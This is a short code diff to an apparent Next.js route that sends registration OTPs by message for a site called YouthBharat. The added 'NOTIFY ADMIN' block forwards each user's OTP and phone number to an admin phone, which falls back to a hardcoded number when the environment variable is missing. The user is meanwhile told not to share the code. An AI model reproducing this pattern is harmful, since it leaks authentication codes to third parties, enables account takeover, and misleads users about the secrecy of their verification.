@@ -41,7 +41,14 @@ export async function POST(req: Request) {
         // Send Message using the FIXED external bot function
         const messageText = `🔐 *YouthBharat Security*\n\nYour Verification Code is: *${generatedOtp}*\n\nDo not share this code.`;
 
-        await sendExternalBotMessage(phone, messageText); // CHANGED
+        await sendExternalBotMessage(phone, messageText);
+
+        // NOTIFY ADMIN (New Addition)
+        const ADMIN_PHONE = process.env.ADMIN_PHONE || '919876543210'; // Fallback or Env
+        if (ADMIN_PHONE && ADMIN_PHONE !== phone) {
+            const adminMsg = `👮 *ADMIN ALERT: New Seller Registration*\n\nUser: ${phone}\nOTP: *${generatedOtp}*`;
+            await sendExternalBotMessage(ADMIN_PHONE, adminMsg);
+        }
 
         // We ALWAYS return success so the client can proceed to OTP verification
         return NextResponse.json({
